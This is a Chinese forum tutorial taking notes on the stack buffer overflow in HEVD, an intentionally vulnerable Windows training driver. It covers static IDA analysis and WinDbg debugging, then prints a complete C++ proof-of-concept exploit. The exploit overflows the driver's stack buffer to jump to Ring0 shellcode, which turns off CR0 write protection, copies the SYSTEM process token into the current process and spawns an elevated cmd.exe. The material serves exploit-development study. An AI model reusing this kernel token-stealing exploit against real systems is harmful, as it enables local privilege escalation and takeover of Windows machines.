> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270172.htm)

> [原创]HEVD 学习笔记 ------ 缓冲区溢出攻击

一. 前言
=====

实验环境与 HEVD 的介绍请看:[HEVD 学习笔记 ------ 概述](https://bbs.pediy.com/thread-270159.htm)

二. 漏洞原理
=======

要理解缓冲区溢出攻击的关键是要理解函数的执行过程，关于这部分内容可以看看这篇文章: [从反汇编的角度学 C/C++ 之函数](https://bbs.pediy.com/thread-269590.htm)。产生该漏洞的关键原因是，当函数退出的时候，会将保存在栈中的返回地址取出，跳转到该地址继续执行，以此来执行函数调用以后的程序。而如果用户的输入没有得到控制，覆盖掉了这个返回地址就会让函数退出的时候，执行我们指定的地址的代码。  

![](https://bbs.pediy.com/upload/attach/202111/835440_TTTK88NEMVQ97MH.jpg)

三. 漏洞分析  

==========

1. 静态分析  

----------

在 IDA 中可以看到，该漏洞是函数地址表中的第一个漏洞，也就是说要触发该漏洞，IOCTL 需要是 0x222003。  

```
PAGE:0044409F loc_44409F:                             ; CODE XREF: DispatchIoCtrl+34↑j
PAGE:0044409F                                         ; DATA XREF: PAGE:Func_Table↓o
PAGE:0044409F                 mov     esi, ds:DbgPrintEx ; jumptable 00444098 case 2236419
PAGE:004440A5                 push    offset aHevdIoctlBuffe ; "****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK"...
PAGE:004440AA                 push    3               ; Level
PAGE:004440AC                 push    DPFLTR_IHVDRIVER_ID ; ComponentId
PAGE:004440AE                 call    esi ; DbgPrintEx
PAGE:004440B0                 add     esp, 0Ch
PAGE:004440B3                 push    ebx             ; 将CurrentStackLocation指针入栈
PAGE:004440B4                 push    edi             ; 将IRP的指针入栈
PAGE:004440B5                 call    BufferOverflowStackIoCtrl
PAGE:004440BA                 push    offset aHevdIoctlBuffe ; "****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK"...
PAGE:004440BF
PAGE:004440BF loc_4440BF:                             ; CODE XREF: DispatchIoCtrl+8B↓j
PAGE:004440BF                                         ; DispatchIoCtrl+AD↓j ...
PAGE:004440BF                 push    3               ; Level
PAGE:004440C1                 push    4Dh             ; ComponentId
PAGE:004440C3                 mov     ebx, eax
PAGE:004440C5                 call    esi ; DbgPrintEx
PAGE:004440C7                 add     esp, 0Ch
PAGE:004440CA                 jmp     loc_4444C5

```

首先将 IRP 和 CurrentStackLocation 的指针压入栈中，随后调用 BufferOverflowStackIoCtrl 函数，继续看该函数内容。

```
PAGE:0044517E BufferOverflowStackIoCtrl proc near     ; CODE XREF: DispatchIoCtrl+51↑p
PAGE:0044517E
PAGE:0044517E arg_pCurrentLocationStack= dword ptr  0Ch
PAGE:0044517E
PAGE:0044517E                 push    ebp
PAGE:0044517F                 mov     ebp, esp
PAGE:00445181                 mov     eax, [ebp+arg_pCurrentLocationStack]
PAGE:00445184                 mov     ecx, STATUS_UNSUCCESSFUL
PAGE:00445189                 mov     edx, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer]
PAGE:0044518C                 mov     eax, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength]
PAGE:0044518F                 test    edx, edx
PAGE:00445191                 jz      short loc_44519C
PAGE:00445193                 push    eax             ; size_t
PAGE:00445194                 push    edx             ; void *
PAGE:00445195                 call    TriggerBufferOverflowStack
PAGE:0044519A                 mov     ecx, eax
PAGE:0044519C
PAGE:0044519C loc_44519C:                             ; CODE XREF: BufferOverflowStackIoCtrl+13↑j
PAGE:0044519C                 mov     eax, ecx
PAGE:0044519E                 pop     ebp
PAGE:0044519F                 retn    8
PAGE:0044519F BufferOverflowStackIoCtrl endp

```

在该函数中，将输入缓冲区的大小与输入缓冲区的指针压入栈中以后，调用 TriggerBufferOverfloaStack 函数，继续跟进这个函数  

```
PAGE:004451A2 ; int __stdcall TriggerBufferOverflowStack(void *, size_t)
PAGE:004451A2 TriggerBufferOverflowStack proc near    ; CODE XREF: BufferOverflowStackIoCtrl+17↑p
PAGE:004451A2
PAGE:004451A2 Dst             = byte ptr -81Ch
PAGE:004451A2 var_1C          = dword ptr -1Ch
PAGE:004451A2 ms_exc          = CPPEH_RECORD ptr -18h
PAGE:004451A2 arg_InputBuffer = dword ptr  8
PAGE:004451A2 arg_InputSize   = dword ptr  0Ch
PAGE:004451A2
PAGE:004451A2                 push    80Ch
PAGE:004451A7                 push    offset stru_4023E0
PAGE:004451AC                 call    __SEH_prolog4
PAGE:004451B1                 xor     edi, edi
PAGE:004451B3                 mov     ebx, 800h
PAGE:004451B8                 push    ebx             ; Size
PAGE:004451B9                 push    edi             ; Val
PAGE:004451BA                 lea     eax, [ebp+Dst]
PAGE:004451C0                 push    eax             ; Dst
PAGE:004451C1                 call    memset
PAGE:004451C6                 add     esp, 0Ch
PAGE:004451C9                 mov     [ebp-4], edi
PAGE:004451CC                 push    1               ; Alignment
PAGE:004451CE                 push    ebx             ; Length
PAGE:004451CF                 push    [ebp+arg_InputBuffer] ; Address
PAGE:004451D2                 call    ds:ProbeForRead

```

在该函数中，首先会将局部变量 Dst 数组初始化为 0，接着在对输入缓冲区进行合法性检查。  

```
PAGE:00445228                 push    [ebp+arg_InputSize] ; MaxCount
PAGE:0044522B                 push    [ebp+arg_InputBuffer] ; Src
PAGE:0044522E                 lea     eax, [ebp+Dst]
PAGE:00445234                 push    eax             ; Dst
PAGE:00445235                 call    memcpy
PAGE:0044523A                 add     esp, 18h
PAGE:0044523D                 jmp     short loc_445266
            。。。
PAGE:00445266 loc_445266:                             ; CODE XREF: TriggerBufferOverflowStack+9B↑j
PAGE:00445266                 mov     dword ptr [ebp-4], 0FFFFFFFEh
PAGE:0044526D                 mov     eax, edi
PAGE:0044526F                 mov     ecx, [ebp-10h]
PAGE:00445272                 mov     large fs:0, ecx
PAGE:00445279                 pop     ecx
PAGE:0044527A                 pop     edi
PAGE:0044527B                 pop     esi
PAGE:0044527C                 pop     ebx
PAGE:0044527D                 leave
PAGE:0044527E                 retn    8
PAGE:0044527E TriggerBufferOverflowStack endp

```

随后，函数会将输入缓冲区中的内容全部拷贝到局部变量 Dst 中。由于在这里并没有检查输入缓冲区的长度是否是合法的，所以这里就产生了漏洞，让我们可以进行缓冲区溢出的攻击。

2. 动态分析  

----------

接下来将用 WinDbg 对其进行动态调试，查看数据情况。首先在 TriggerBufferOverflowStack 函数中下断点，然后在用户层发送 IOCTL 以后程序将断在函数的开头地址，此时 esp 以及栈中的数据如下图所示  

![](https://bbs.pediy.com/upload/attach/202111/835440_RE9698HK8V6NZ8T.jpg)

此时 esp 所保存的 0x99151AD4 所保存的 0x8EFDD19A 就是执行完函数以后的返回地址。继续在 memcpy 函数下断点以后运行程序，此时寄存器状态与栈中情况如下图所示  

![](https://bbs.pediy.com/upload/attach/202111/835440_V2AVZW7UJ76CM2A.jpg)

也就是说要拷贝的局部变量的目的地址是 0x991512B4，那也就是说想要输入的数据覆盖到返回地址，我们需要提供 0x99151A4D-0x991512B4=0x820 大小的字节数据来填充上面的内容，接着的 4 字节就会覆盖掉返回地址。此时这个地址，就可以指定为 ShellCode 的地址，这样当函数退出的时候，就会执行我们想要执行的 ShellCode。  

这里还需要注意的是，正常执行的时候，函数执行完了会返回上层的 BufferOverflowStackIoCtrl 函数，而这个函数的最终会执行如下的两条指令来返回更上一层的函数执行

![](https://bbs.pediy.com/upload/attach/202111/835440_2SVY5FV38JPF8JK.jpg)

所以，为了程序的正常退出，在 ShellCode 的末尾也需要这样的两句代码。  

四. 漏洞利用  

==========

根据上面的内容可以得出如下的 POC 来对漏洞进行利用

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
 
#include  #include  #include  #include "ntapi.h"
#pragma comment(linker, "/defaultlib:ntdll.lib")
 
#define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222003
#define OUT_BUFFER_LENGTH 0
 
void ShowError(PCHAR msg);
VOID Ring0ShellCode();
 
BOOL g_bIsExecute = FALSE;
 
int main()
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
 
    // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                         GENERIC_READ | GENERIC_WRITE,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile Error");
        goto exit;
    }
 
    CONST DWORD dwIputSize = 0x820 + 0x4; // 0x820用来填充垃圾数据，随后4字节填充返回地址
    CHAR szInputData[dwIputSize] = { 0 };
 
    *(PDWORD)(szInputData + 0x820) = (DWORD)Ring0ShellCode; // 指定返回地址为ShellCode
    // 与驱动设备进行交互
    if (!DeviceIoControl(hDevice,
                         IOCTL,
                         szInputData,
                         dwIputSize,
                         NULL,
                         0,
                         &dwReturnLength,
                         NULL))
    {
        printf("DeviceIoControl Error");
        goto exit;
    }
 
    if (g_bIsExecute)
    {
        printf("Ring0 代码执行完成\n");
    }
 
    si.cb = sizeof(si);
    if (!CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
                       NULL,
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NEW_CONSOLE,
                       NULL,
                       NULL,
                       &si,
                       &pi))
    {
        ShowError("CreateProcess");
        goto exit;
    }
 
exit:
    if (hDevice) NtClose(hDevice);
    system("pause");
    return 0;
}
 
void ShowError(PCHAR msg)
{
    printf("%s Error 0x%X\n", msg, GetLastError());
}
 
VOID __declspec(naked) Ring0ShellCode()
{
    __asm
    {
        pushfd
        pushad
        sub esp, 0x40
    }
 
    // 关闭页保护
    __asm
    {
        cli
        mov eax, cr0
        and eax, ~0x10000
        mov cr0, eax
    }
 
    __asm
    {
        // 取当前线程
        mov eax, fs:[0x124]
        // 取线程对应的EPROCESS
        mov esi, [eax + 0x150]
        mov eax, esi
    searchWin7:
        mov eax, [eax + 0xB8]
        sub eax, 0x0B8
        mov edx, [eax + 0xB4]
        cmp edx, 0x4
        jne searchWin7
        mov eax, [eax + 0xF8]
        mov [esi + 0xF8], eax
    }
 
    // 开起页保护
    __asm
    {
        mov eax, cr0
        or eax, 0x10000
        mov cr0, eax
        sti
    }
 
    g_bIsExecute = TRUE;
 
    __asm
    {
        add esp, 0x40
        popad
        popfd
 
        xor eax, eax
        pop ebp
        ret 8
    }
} 
```

最终可以看到，程序提权成功  

![](https://bbs.pediy.com/upload/attach/202111/835440_DCP67WU3TQBHJCC.jpg)

[[培训] 优秀毕业生寄语：恭喜 id 咸鱼炒白菜拿到远超 3W 月薪的 offer，《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-16096.htm)

最后于 1 小时前 被 1900 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm) [#缓冲区溢出](forum-150-1-156.htm)